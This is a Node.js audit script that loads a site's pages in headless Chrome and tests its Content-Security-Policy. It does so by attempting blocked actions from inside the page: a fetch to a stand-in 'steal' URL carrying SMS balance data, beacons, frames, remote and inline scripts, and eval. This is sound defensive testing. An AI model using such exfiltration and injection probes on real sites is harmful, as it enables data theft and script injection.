#!/usr/bin/env node
'use strict';
/* Loads every page in a real Chrome under the page's own Content-Security-Policy and reports violations, script errors, failed requests,
   the fonts that actually loaded, and whether the link-check model loaded. Then attacks the policy from inside the page: a fetch, an
   image, a beacon, an XHR, a script and a frame pointed at another host, an inline script, eval, new Function. Each must be refused.
   BASE=https://... checks a deployed site instead of the local files. Usage: npm run audit:pages */
const fs = require('node:fs'), path = require('node:path');
const { launch, serve } = require('./cdp.js');
(async () => {
  const local = !process.env.BASE, site = local ? await serve() : null, base = process.env.BASE || site.base, b = await launch(), bag = []; let failed = 0;
  b.on(m => {
    if (m.method === 'Log.entryAdded' && ['error', 'warning'].includes(m.params.entry.level)) bag.push(m.params.entry.text.slice(0, 150));
    if (m.method === 'Runtime.exceptionThrown') bag.push('exception: ' + ((m.params.exceptionDetails.exception || {}).description || m.params.exceptionDetails.text).slice(0, 150));
  });
  for (const p of ['index', 'about', 'data', 'tips', 'assistant', 'report']) {
    bag.length = 0; await b.goto(`${base}/${p}.html?x=${Date.now()}`); await b.sleep(p === 'index' ? 8000 : 1500);
    const i = JSON.parse(await b.eval(`JSON.stringify({ csp: !!document.querySelector('meta[http-equiv=Content-Security-Policy]'), fonts: [...new Set([...document.fonts].filter(f => f.status === 'loaded').map(f => f.family))], model: document.documentElement.dataset.nameModel })`));
    const ok = i.csp && i.model === 'ready' && !bag.length && i.fonts.length >= 3; if (!ok) failed++;
    console.log((ok ? 'ok   ' : 'FAIL ') + p.padEnd(10), `policy ${i.csp ? 'on' : 'MISSING'}, model ${i.model}, fonts ${i.fonts.join('/')}`, bag.length ? '\n     ' + bag.join('\n     ') : '');
  }
  // The attacks. A frame and a beacon give no result the page can read (a refused frame still fires onload for an empty document, and
  // sendBeacon returns true once it has queued), so for those the proof is the browser's own refusal message, checked below.
  bag.length = 0; await b.goto(`${base}/assistant.html?x=${Date.now()}`);
  const probe = path.join(__dirname, '..', '..', '__policy_probe.js');
  if (local) fs.writeFileSync(probe, "window.__p = {}; try { eval('1'); __p.eval = 'RAN'; } catch (e) { __p.eval = 'blocked'; } try { new Function('return 1')(); __p.fn = 'RAN'; } catch (e) { __p.fn = 'blocked'; }");
  const attacks = JSON.parse(await b.eval(`(async () => {
    const r = {}, wait = start => new Promise(done => { start(done); setTimeout(() => done('blocked'), 2500); });
    r.fetch = await fetch('https://example.com/steal?sms=balance').then(() => 'LEAKED', () => 'blocked');
    r.xhr = await wait(done => { const x = new XMLHttpRequest(); x.open('GET', 'https://example.com/'); x.onerror = () => done('blocked'); x.onload = () => done('LEAKED'); x.send(); });
    r.image = await wait(done => { const i = new Image(); i.onload = () => done('LOADED'); i.onerror = () => done('blocked'); i.src = 'https://example.com/p.png?x=1'; });
    r.script = await wait(done => { const s = document.createElement('script'); s.src = 'https://cdn.jsdelivr.net/npm/lodash/lodash.min.js'; s.onload = () => done('LOADED'); s.onerror = () => done('blocked'); document.head.appendChild(s); });
    r.inline = await wait(done => { window.__x = 0; const s = document.createElement('script'); s.textContent = 'window.__x=1'; document.body.appendChild(s); setTimeout(() => done(window.__x === 1 ? 'RAN' : 'blocked'), 300); });
    navigator.sendBeacon('https://example.com/beacon', 'x');
    const f = document.createElement('iframe'); f.src = 'https://example.com/'; document.body.appendChild(f); await new Promise(done => setTimeout(done, 1500));
    ${local ? "await new Promise(done => { const s = document.createElement('script'); s.src = '__policy_probe.js'; s.onload = s.onerror = done; document.head.appendChild(s); }); r.eval = window.__p && window.__p.eval; r.newFunction = window.__p && window.__p.fn;" : ''}
    return JSON.stringify(r);
  })()`));
  if (local) fs.rmSync(probe, { force: true });
  console.log('attacks on the policy:', JSON.stringify(attacks));
  const refusedByMessage = { beacon: /Connecting to 'https:\/\/example\.com\/beacon'/, frame: /Framing 'https:\/\/example\.com\//, 'inline script': /inline script/i };
  const missing = Object.entries(refusedByMessage).filter(([, re]) => !bag.some(t => re.test(t))).map(([name]) => name);
  const gotThrough = Object.entries(attacks).filter(([, v]) => ['LEAKED', 'LOADED', 'RAN'].includes(v)).map(([name]) => name);
  if (gotThrough.length || missing.length) { failed++; console.log('FAIL: got through:', gotThrough, '| no refusal message for:', missing); }
  else console.log(`every attack refused (${Object.keys(attacks).length} read directly, ${Object.keys(refusedByMessage).length} confirmed by the browser's refusal message)`);
  b.close(); if (site) site.close(); process.exit(failed ? 1 : 0);
})().catch(e => { console.error(e); process.exit(1); });
